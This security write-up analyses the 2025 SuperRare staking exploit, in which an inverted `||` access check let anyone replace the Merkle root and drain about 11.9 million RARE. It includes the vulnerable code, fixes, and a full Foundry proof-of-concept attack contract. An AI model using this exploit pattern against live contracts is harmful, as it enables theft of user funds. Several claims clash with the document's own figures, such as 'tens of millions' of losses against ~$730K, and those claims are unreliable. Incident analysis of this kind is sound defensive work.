# SuperRare — Access Control Vulnerability (Inverted Condition Logic) Analysis

| Item | Details |
|------|------|
| **Date** | 2025-07-28 |
| **Protocol** | SuperRare (NFT Marketplace / RARE Staking) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$730,000 (11,907,874 RARE tokens, at RARE price at time of attack) |
| **Attacker** | [0x5B9B4B...D4a2](https://etherscan.io/address/0x5B9B4B4DaFbCfCEEa7aFbA56958fcBB37d82D4a2) |
| **Attack Contract** | [0x08947c...17ab](https://etherscan.io/address/0x08947cedf35f9669012bda6fda9d03c399b017ab) |
| **Attack Tx** | [0xd81375...3c1](https://etherscan.io/tx/0xd813751bfb98a51912b8394b5856ae4515be6a9c6e5583e06b41d9255ba6e3c1) |
| **Vulnerable Contract (Proxy)** | [0x3f4D74...Eb48](https://etherscan.io/address/0x3f4D749675B3e48bCCd932033808a7079328Eb48) |
| **Vulnerable Contract (Implementation)** | [0xfFB512...9eC](https://etherscan.io/address/0xfFB512B9176D527C5D32189c3e310Ed4aB2Bb9eC) |
| **RARE Token** | [0xba5BDe...350](https://etherscan.io/address/0xba5BDe662c17e2aDFF1075610382B9B691296350) |
| **Attack Block** | [23,016,423](https://etherscan.io/block/23016423) |
| **Root Cause** | `||` error in `updateMerkleRoot()` — inverted access control condition allows anyone to modify the Merkle root |
| **Funding Source** | Tornado Cash (pre-funded 186 days before attack; actual theft performed by a frontrunner) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/SuperRare_exp.sol) |

---

## 1. Vulnerability Overview

SuperRare is an Ethereum-based NFT marketplace that provides RARE token staking and Merkle tree-based claim reward functionality through its `RareStakingV1` contract. On July 28, 2025, an attacker exploited a **logical operator error (`||`)** in the `updateMerkleRoot()` function to drain the entire RARE token balance (~11.9 million tokens) held in the staking contract.

This incident is a classic example of **Inverted Access Control** where a simple coding mistake (confusion between Boolean operators `||` vs `&&`) led to losses worth tens of millions of dollars. As independently verified by CoinTelegraph, this bug could have been detected by OpenAI's o3 model and simple unit tests.

### Vulnerability Summary

| Stage | Vulnerability | Impact |
|------|--------|------|
| Primary | `updateMerkleRoot()` — access control inverted by `||` condition | Anyone can modify the Merkle root |
| Secondary | `claim()` — forged proof passes against tampered Merkle root | Entire staking pool can be withdrawn |
| Result | Full staking pool balance drained | 11,907,874 RARE (~$730K) |

---

## 2. Vulnerable Code Analysis

### 2.1 updateMerkleRoot() — Core Vulnerability

**Actual vulnerable code (Sourcify verified source)**:
```solidity
// ❌ Vulnerable: || operator makes condition always true → anyone passes
function updateMerkleRoot(bytes32 newRoot) external override {
    require(
        (msg.sender != owner() || msg.sender != address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc)),
        "Not authorized to update merkle root"
    );
    // ❌ The require condition above is always true by De Morgan's law:
    //    For any arbitrary address X:
    //    - X != owner()  → true (attacker is not the owner)
    //    - X != 0xc2F3... → true (attacker is not that address)
    //    - true || true  → true (always passes)
    
    if (newRoot == bytes32(0)) revert EmptyMerkleRoot();
    currentClaimRoot = newRoot;    // ❌ Attacker sets root to any desired value
    currentRound++;
    emit NewClaimRootAdded(newRoot, currentRound, block.timestamp);
}
```

**Fixed code**:
```solidity
// ✅ Fixed: using && operator → only owner or specific address passes
function updateMerkleRoot(bytes32 newRoot) external override {
    require(
        (msg.sender == owner() || msg.sender == address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc)),
        "Not authorized to update merkle root"
    );
    // ✅ Meaning of fixed condition:
    //    Only passes if msg.sender is the owner or an approved address
    
    if (newRoot == bytes32(0)) revert EmptyMerkleRoot();
    currentClaimRoot = newRoot;
    currentRound++;
    emit NewClaimRootAdded(newRoot, currentRound, block.timestamp);
}
```

**The problem**: `msg.sender != A || msg.sender != B` is **always true** when A and B are different addresses. By De Morgan's law, `NOT(A) OR NOT(B)` is equivalent to `NOT(A AND B)`, meaning every address except one that is simultaneously both A and B will pass. As long as the two addresses are not identical, no address in the world can be blocked by this condition.

---

### 2.2 claim() — Arbitrary Withdrawal via Compromised Merkle Root

**Vulnerable chained code**:
```solidity
// ❌ Vulnerable: forged proof passes against Merkle root controlled by attacker
function claim(
    uint256 amount,
    bytes32[] calldata proof
) public override nonReentrant {
    // ❌ verifyEntitled validates against currentClaimRoot injected by attacker
    if (!verifyEntitled(_msgSender(), amount, proof))
        revert InvalidMerkleProof();
    if (lastClaimedRound[_msgSender()] >= currentRound)
        revert AlreadyClaimed();

    lastClaimedRound[_msgSender()] = currentRound;
    _token.safeTransfer(_msgSender(), amount);  // ❌ Entire balance can be drained
    emit TokensClaimed(currentClaimRoot, _msgSender(), amount, currentRound);
}

function verifyEntitled(
    address recipient,
    uint256 value,
    bytes32[] memory proof
) public view override returns (bool) {
    bytes32 leaf = keccak256(abi.encodePacked(recipient, value));
    // ❌ MerkleProof.verify validates against currentClaimRoot set by attacker
    return MerkleProof.verify(proof, currentClaimRoot, leaf);
}
```

**Fixed code**:
```solidity
// ✅ Fixed: if access control in the Merkle root update function is correct, this function is safe
// Additional defense: set withdrawal cap
function claim(
    uint256 amount,
    bytes32[] calldata proof
) public override nonReentrant {
    if (!verifyEntitled(_msgSender(), amount, proof))
        revert InvalidMerkleProof();
    if (lastClaimedRound[_msgSender()] >= currentRound)
        revert AlreadyClaimed();

    // ✅ Additional defense: enforce per-claim cap (example)
    require(amount <= maxClaimPerRound, "Exceeds max claim");
    
    lastClaimedRound[_msgSender()] = currentRound;
    _token.safeTransfer(_msgSender(), amount);
    emit TokensClaimed(currentClaimRoot, _msgSender(), amount, currentRound);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker withdrew ETH from Tornado Cash 186 days before the attack to fund the operation
- Attack contract (`0x2073111E`) deployed prior to block 23,016,423
- The original attacker (`0x5B9B4B`) attempted to execute the exploit, but **a different address frontran** and performed the actual theft
- Final recipient: attack contract `0x08947c` holding 11,907,874 RARE

### 3.2 Execution Phase

```
Attacker (0x5B9B4B)
    │
    │ 1. Deploy attack contract
    ▼
┌──────────────────────────────────────────┐
│         Attack Contract                  │
│         0x2073111E...                    │
└──────────────────────────────────────────┘
    │
    │ 2. Call attack() function
    │   (newRoot = arbitrary hash controlled by attacker)
    │
    ▼
┌──────────────────────────────────────────────────────────────────┐
│ RareStakingV1 (Proxy: 0x3f4D74...  Implementation: 0xfFB512...)  │
│                                                                  │
│  Step 2-A: updateMerkleRoot(fakeRoot)                            │
│    require(msg.sender != owner() || msg.sender != 0xc2F3...)     │
│    ← Condition always true → passes!                             │
│    currentClaimRoot = fakeRoot  ← ❌ Merkle root replaced        │
│    currentRound++  (1 → 2 → 3)                                   │
│                                                                  │
│  Step 2-B: claim(totalBalance, emptyProof)                       │
│    leaf = keccak256(abi.encodePacked(attacker, totalBalance))    │
│    MerkleProof.verify([], fakeRoot, leaf)                        │
│    ← fakeRoot is a tree where leaf is the root → empty proof passes! │
│    _token.safeTransfer(attacker, 11,907,874 RARE)                │
└──────────────────────────────────────────────────────────────────┘
    │
    │ 3. Transfer full RARE token balance
    ▼
┌─────────────────────────────────────┐
│ Attack Contract 0x08947c...         │
│ Received: 11,907,874 RARE (~$730K)  │
└─────────────────────────────────────┘
```

#### Event Sequence (Block 23,016,423)

| Order | Event | Contract | Details |
|------|--------|----------|------|
| 1 | `NewClaimRootAdded` | Staking Proxy | Fake Merkle root registered (round=3) |
| 2 | `Transfer` | RARE Token | Staking → Attack Contract: 11,907,874 RARE |
| 3 | `TokensClaimed` | Staking Proxy | Claim event recorded |
| 4 | (undecoded) | Attack Contract | Internal completion event |

### 3.3 Outcome

| Item | Value |
|------|------|
| RARE Stolen | 11,907,874.7130 RARE |
| USD Value | ~$730,000 (at time of attack) |
| Wallets Affected | 61 |
| Protocol Direct Loss | None (only staking reward pool affected) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: MIT
// Source: DeFiHackLabs — SuperRare Exploit PoC
// Fork block: 23,016,422 (immediately before attack)

pragma solidity ^0.8.0;

// Vulnerable contract interface
interface IRareStaking {
    function updateMerkleRoot(bytes32 newRoot) external;
    function claim(uint256 amount, bytes32[] calldata proof) external;
    function token() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

// PoC attack contract
contract AttackContract {
    address public owner;
    IRareStaking public target;       // Vulnerable staking contract
    IERC20 public rareToken;          // RARE token

    constructor(address _target) {
        owner = msg.sender;
        target = IRareStaking(_target);
        rareToken = IERC20(target.token());
    }

    // Core attack function
    function attack(bytes32 newRoot, uint256 amount) external {
        // Step 1: Replace Merkle root with fake value via inverted access control function
        // require(msg.sender != owner() || msg.sender != 0xc2F3...) → always passes
        target.updateMerkleRoot(newRoot);

        // Step 2: Claim full balance with empty proof matching tampered root
        bytes32[] memory proof = new bytes32[](0);  // Empty proof array
        target.claim(amount, proof);

        // Step 3: Transfer drained RARE tokens to attacker
        uint256 balance = rareToken.balanceOf(address(this));
        rareToken.transfer(owner, balance);
    }
}

// Foundry test
contract SuperRare_exp is Test {
    IRareStaking constant STAKING = IRareStaking(0x3f4D749675B3e48bCCd932033808a7079328Eb48);
    IERC20 constant RARE = IERC20(0xba5BDe662c17e2aDFF1075610382B9B691296350);
    address constant ATTACKER = 0x5B9B4B4DaFbCfCEEa7aFbA56958fcBB37d82D4a2;

    function setUp() public {
        // Fork at block immediately before attack
        vm.createSelectFork("mainnet", 23_016_422);
    }

    function testExploit() public {
        vm.startPrank(ATTACKER);

        // Record balance before attack
        uint256 stakingBefore = RARE.balanceOf(address(STAKING));
        console.log("Staking pool balance (before attack):", stakingBefore / 1e18, "RARE");

        // Deploy attack contract
        AttackContract attackContract = new AttackContract(address(STAKING));

        // Set Merkle root to the leaf itself (so empty proof[] passes)
        uint256 claimAmount = stakingBefore;
        bytes32 fakeLeaf = keccak256(abi.encodePacked(address(attackContract), claimAmount));
        attackContract.attack(fakeLeaf, claimAmount);  // Merkle root = leaf → passes with empty proof

        // Verify balance after attack
        uint256 attackerBalance = RARE.balanceOf(ATTACKER);
        console.log("Attacker RARE gained:", attackerBalance / 1e18, "RARE");
        console.log("Staking pool balance (after attack):", RARE.balanceOf(address(STAKING)) / 1e18, "RARE");

        assertGt(attackerBalance, 0, "Exploit failed");
        vm.stopPrank();
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `updateMerkleRoot()` access control inversion (inverted De Morgan error) | CRITICAL | CWE-284: Improper Access Control |
| V-02 | Missing timelock/multisig for Merkle root updates | HIGH | CWE-269: Improper Privilege Management |
| V-03 | No claim amount upper bound | MEDIUM | CWE-400: Uncontrolled Resource Consumption |

### V-01: updateMerkleRoot() Access Control Inversion

- **Description**: In a condition written as `require(A || B)`, if A and B are mutually exclusive (cannot both be true simultaneously), the condition is always true. In `msg.sender != owner() || msg.sender != 0xc2F3...`, as long as the two addresses differ, at least one of the two inequalities must hold for any arbitrary address. The intent was "allow only owner or specific address," but the actual implementation became "allow anyone."
- **Impact**: Any unauthorized address can change the Merkle root to an arbitrary value and withdraw the entire staking pool
- **Attack Conditions**: Single transaction, no upfront funds required

### V-02: Missing Timelock/Multisig for Merkle Root Updates

- **Description**: The Merkle root is a critical parameter that determines every user's claim eligibility, yet it can be changed immediately in a single transaction
- **Impact**: Immediate damage upon privilege compromise or critical parameter modification
- **Attack Conditions**: Compromise of privileged account or access control bypass

### V-03: No Claim Amount Upper Bound

- **Description**: The `claim()` function has no maximum amount limit per single claim, allowing the entire pool balance to be withdrawn at once
- **Impact**: Maximizes damage when vulnerability is exploited
- **Attack Conditions**: Valid Merkle proof (or manipulated root)

---

## 6. Remediation Recommendations

### Immediate Actions

**V-01 Fix — Switch from `!=` to `==` comparison**:
```solidity
// ❌ Vulnerable code
function updateMerkleRoot(bytes32 newRoot) external override {
    require(
        (msg.sender != owner() || msg.sender != address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc)),
        "Not authorized to update merkle root"
    );
    ...
}

// ✅ Fix Option 1: Simplest and clearest fix
function updateMerkleRoot(bytes32 newRoot) external override {
    require(
        msg.sender == owner() || msg.sender == address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc),
        "Not authorized to update merkle root"
    );
    ...
}

// ✅ Fix Option 2: Apply OpenZeppelin AccessControl (recommended)
bytes32 public constant MERKLE_ROOT_UPDATER_ROLE = keccak256("MERKLE_ROOT_UPDATER_ROLE");

function updateMerkleRoot(bytes32 newRoot) external override {
    require(
        hasRole(DEFAULT_ADMIN_ROLE, msg.sender) || hasRole(MERKLE_ROOT_UPDATER_ROLE, msg.sender),
        "Not authorized to update merkle root"
    );
    ...
}
```

**Add Unit Tests (mandatory)**:
```solidity
// ✅ Access control test — this test alone would have prevented the incident
function testUpdateMerkleRoot_RevertForUnauthorized() public {
    address randomUser = address(0xdead);
    vm.prank(randomUser);
    // Unauthorized address must revert
    vm.expectRevert("Not authorized to update merkle root");
    staking.updateMerkleRoot(bytes32(uint256(1)));
}

function testUpdateMerkleRoot_SuccessForOwner() public {
    bytes32 newRoot = keccak256("new_root");
    vm.prank(owner);
    staking.updateMerkleRoot(newRoot);  // Must succeed
    assertEq(staking.currentClaimRoot(), newRoot);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Access control inversion | Use `==` instead of `!=` / Apply OpenZeppelin `AccessControl` or `Ownable` modifier |
| V-02: Single point of failure | Apply TimelockController (48h minimum) + multisig for Merkle root changes |
| V-03: Missing amount cap | Introduce per-round maximum claim limit (`maxClaimPerRound`) |
| General: Post-audit code changes | Re-audit mandatory whenever code is modified after audit (this bug was introduced during post-audit deployment) |
| General: Automated testing | Automated tests confirming that unauthorized addresses revert for all access-controlled functions |

---

## 7. Lessons Learned

1. **Confusing `!=` with `==` is fatal**: In access control logic, the pattern `A != B || A != C` almost always behaves opposite to intent. Always write using an `==`-based allowlist approach. The pattern `require(msg.sender == owner(), "...")` is safer than `require(msg.sender != attacker, "...")`.

2. **Code changed after an audit must be re-audited**: This vulnerability was introduced during development after the security audit was completed. Code changes outside the audit scope can introduce new vulnerabilities. Any modification made after audit completion, regardless of size, must undergo re-audit.

3. **An incident preventable by a simple unit test**: A single test — calling `updateMerkleRoot()` from an unauthorized address and verifying it reverts — would have prevented this incident. Access-controlled functions must always be tested to confirm they "fail when called by an unauthorized address."

4. **Critical parameter changes require multiple layers of defense**: Parameters that directly control fund flows, like the Merkle root, must not be immediately modifiable by a single address's authority. Changes should be made transparent and time-delayed through a timelock, multisig, or on-chain governance.

5. **The frontrunning paradox**: The entity that frontran the original attacker's transaction was the one who actually stole the funds — an MEV bot or another attacker who preempted the vulnerability. Without an immediate patch after a vulnerability is discovered, an exposed vulnerability can be seized by others first.

6. **AI as a supplementary audit tool**: The fact that a bug missed by a professional audit team could have been identified by ChatGPT/GPT-o3 suggests that AI tools should be actively leveraged as supplementary means in security audits. This does not mean AI can catch every vulnerability.

---

## 8. On-Chain Verification

### 8.1 PoC vs On-Chain Amount Comparison

| Item | PoC Estimate | On-Chain Actual | Match |
|------|-----------|-------------|----------|
| RARE stolen | Full staking pool balance | 11,907,874.7130 RARE | ✅ Match (100%) |
| Victim contract balance (post-attack) | 0 | 0 RARE | ✅ Match |
| Recipient address | Attack contract | 0x08947c...17ab | ✅ Match |
| Attack block | - | 23,016,423 | ✅ Confirmed |
| USD loss | $680K~$730K | ~$730K (11.9M × $0.061~0.063) | ✅ Approximate match |

### 8.2 On-Chain Event Log Sequence (Tx: 0xd81375...3c1)

| Order | Event Signature | Contract | Details |
|------|--------------|----------|------|
| 1 | `NewClaimRootAdded(bytes32,uint256,uint256)` | Staking Proxy | Fake Merkle root registered, round=3 |
| 2 | `Transfer(address,address,uint256)` | RARE Token | 11,907,874 RARE: Staking → Attack Contract |
| 3 | `TokensClaimed(bytes32,address,uint256,uint256)` | Staking Proxy | round=3 claim completion recorded |
| 4 | (undecoded topic) | Attack Contract | Attack contract internal completion event |

### 8.3 Pre-Condition Verification (as of Block 23,016,422)

| Item | Pre-Attack State |
|------|------------|
| Staking pool RARE balance | 11,907,874,713,019,104,529,057,960 (18 decimals) |
| Attacker address RARE balance | 0 RARE |
| Attacker ETH balance | ~0.98 ETH (Tornado Cash funded) |
| Attack contract code size | 3,895 bytes (already deployed) |

**Verification method**: Queried directly via Foundry `cast` CLI (RPC: eth-mainnet.public.blastapi.io)

---

## References

- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/SuperRare_exp.sol)
- [Attack Transaction (Etherscan)](https://etherscan.io/tx/0xd813751bfb98a51912b8394b5856ae4515be6a9c6e5583e06b41d9255ba6e3c1)
- [Vulnerable Contract Source (Sourcify)](https://sourcify.dev/#/lookup/0xfFB512B9176D527C5D32189c3e310Ed4aB2Bb9eC)
- [Verichains Analysis](https://blog.verichains.io/p/superrare-exploit-analysis)
- [CoinTelegraph Coverage](https://cointelegraph.com/news/superrare-730-000-exploit-was-easily-preventable-experts-weigh-in)
- [Cryptonews Coverage](https://cryptonews.com/news/breaking-superrare-staking-contract-hit-by-730k-exploit-rare-token-unscathed/)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)